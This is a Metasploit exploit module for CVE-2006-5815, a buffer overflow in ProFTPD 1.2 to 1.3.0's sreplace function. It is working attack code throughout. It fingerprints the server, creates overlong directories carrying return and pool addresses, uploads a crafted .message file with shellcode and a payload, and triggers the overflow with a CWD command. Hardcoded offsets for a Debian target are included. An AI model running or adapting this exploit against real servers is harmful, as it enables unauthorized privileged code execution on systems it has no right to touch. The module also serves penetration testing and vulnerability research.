##
# $Id: proftp_sreplace.rb 11526 2011-01-09 23:33:53Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Ftp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'ProFTPD 1.2 - 1.3.0 sreplace Buffer Overflow (Linux)',
			'Description'    => %q{
					This module exploits a stack-based buffer overflow in versions 1.2 through
				1.3.0 of ProFTPD server. The vulnerability is within the "sreplace" function
				within the "src/support.c" file.

				The off-by-one heap overflow bug in the ProFTPD sreplace function has been
				discovered about 2 (two) years ago by Evgeny Legerov. We tried to exploit
				this off-by-one bug via MKD command, but failed. We did not work on this bug
				since then.

				Actually, there are exists at least two bugs in sreplace function, one is the
				mentioned off-by-one heap overflow bug the other is a stack-based buffer overflow
				via 'sstrncpy(dst,src,negative argument)'.

				We were unable to reach the "sreplace" stack bug on ProFTPD 1.2.10 stable
				version, but the version 1.3.0rc3 introduced some interesting changes, among them:

				1. another (integer) overflow in sreplace!
				2. now it is possible to reach sreplace stack-based buffer overflow bug via
					the "pr_display_file" function!
				3. stupid '.message' file display bug

				So we decided to choose ProFTPD 1.3.0 as a target for our exploit.
				To reach the bug, you need to upload a specially created .message file to a
				writeable directory, then do "CWD <writeable directory>" to trigger the invocation
				of sreplace function.

				Note that ProFTPD 1.3.0rc3 has introduced a stupid bug: to display '.message'
				file you also have to upload a file named '250'. ProFTPD 1.3.0 fixes this bug.

				The exploit is a part of VulnDisco Pack since Dec 2005.
			},
			'Author'         =>
				[
					'Evgeny Legerov <admin [at] gleg.net>',  # original .pm version (VulnDisco)
					'jduck'   # Metasploit 3.x port
				],
			'Version'        => '$Revision: 11526 $',
			'References'     =>
				[
					[ 'CVE', '2006-5815' ],
					[ 'OSVDB', '68985' ],
					[ 'BID', '20992' ],
					[ 'URL', 'http://seclists.org/bugtraq/2006/Nov/94' ],
					[ 'URL', 'http://seclists.org/bugtraq/2006/Nov/538' ],
					[ 'URL', 'http://bugs.proftpd.org/show_bug.cgi?id=2858' ],
					[ 'URL', 'http://proftp.cvs.sourceforge.net/proftp/proftpd/src/main.c?view=diff&r1=text&tr1=1.292&r2=text&tr2=1.294&diff_format=h' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'PrependChrootBreak' => true
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 900,
					'BadChars' => "\x00\x0a\x0d\x25",
					'DisableNops'	=>  'True',
				},
			'Platform'       => [ 'linux' ],
			'Targets'        =>
			[
				#
				# Automatic targeting via fingerprinting
				#
				[ 'Automatic Targeting', { 'auto' => true }  ],

				#
				# This special one comes first since we dont want its index changing.
				#
				[	'Debug',
					{
						'Ret' => 0x41414242,
						'PoolAddr' => 0x43434545
					}
				],

				#
				# specific targets
				#

				[ "ProFTPD 1.3.0 (source install) / Debian 3.1",
					{
						# objdump -D proftpd|grep call|grep edx
						'Ret' => 0x804afc8, # call edx
						# nm proftpd|grep permanent_pool
						'PoolAddr' => 0x80b59f8
					}
				]

			],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Nov 26 2006'))

		register_options(
			[
				OptString.new('WRITABLE', [ true, 'A writable directory on the target host', '/incoming' ])
			], self.class )
	end


	def check
		# NOTE: We don't care if the login failed here...
		ret = connect

		# We just want the banner to check against our targets..
		print_status("FTP Banner: #{banner.strip}")

		status = CheckCode::Safe

		if banner =~ /ProFTPD (1\.[23]\.[^ ])/i
			ver = $1
			maj,min,rel = ver.split('.')
			relv = rel.slice!(0,1)
			case relv
			when '2'
				status = CheckCode::Vulnerable

			when '3'
				# 1.3.x before 1.3.1 is vulnerable
				status = CheckCode::Vulnerable
				if rel.length > 0
					if rel.to_i > 0
						status = CheckCode::Safe
					else
						status = CheckCode::Vulnerable
					end
				end
			end
		end

		disconnect
		return status
	end


	def exploit
		connect_login

		# Use a copy of the target
		mytarget = target

		if (target['auto'])
			mytarget = nil

			print_status("Automatically detecting the target...")
			if (banner and (m = banner.match(/ProFTPD (1\.3\.[23][^ ]) Server/i))) then
				print_status("FTP Banner: #{banner.strip}")
				version = m[1]
			else
				raise RuntimeError, "No matching target"
			end

			regexp = Regexp.escape(version)
			self.targets.each do |t|
				if (t.name =~ /#{regexp}/) then
					mytarget = t
					break
				end
			end

			if (not mytarget)
				raise RuntimeError, "No matching target"
			end

			print_status("Selected Target: #{mytarget.name}")
		else
			print_status("Trying target #{mytarget.name}...")
			if banner
				print_status("FTP Banner: #{banner.strip}")
			end
		end

		#puts "attach and press any key"; bleh = $stdin.gets
		res = send_cmd(['CWD', datastore['WRITABLE']])

		pwd = send_cmd(['PWD'])
		if pwd !~ /257\s\"(.+)\"/
			raise RuntimeError, "Unable to get current working directory"
		end
		pwd = $1
		pwd << "/" if pwd[-1,1] != "/"

		dir1 = "A" * (251 - pwd.length)
		res = send_cmd(['MKD', dir1])

		res = send_cmd(['CWD', dir1])

		res = send_cmd(['PWD'])

		dir2 = "B" * 64
		dir2 << [mytarget.ret].pack('V')
		dir2 << [mytarget['PoolAddr'] - 4].pack('V')
		dir2 << "\xcc" * 28

		res = send_cmd(['DELE', "#{dir2}/.message"])
		res = send_cmd(['DELE', "250"])
		res = send_cmd(['RMD', dir2])

		filedata = ''
		filedata << 'A'
		filedata << "\x66\x81\xc2\x5e\x13\x52\xc3"; # add $0x135e, %dx; push %edx; ret
		filedata << "\x25C" * 11
		filedata << 'A'
		filedata << payload.encoded
		filedata << rand_text_alphanumeric(900 - payload.encoded.length)
		filedata << "\x25\x43\x41" * 10

		res = send_cmd(['MKD', dir2])
		res = send_cmd_data(['PUT', "#{dir2}/.message"], filedata, 'I')

		# Trigger sreplace overflow
		res = send_cmd(['CWD', dir2])

		handler
		disconnect

	end

end
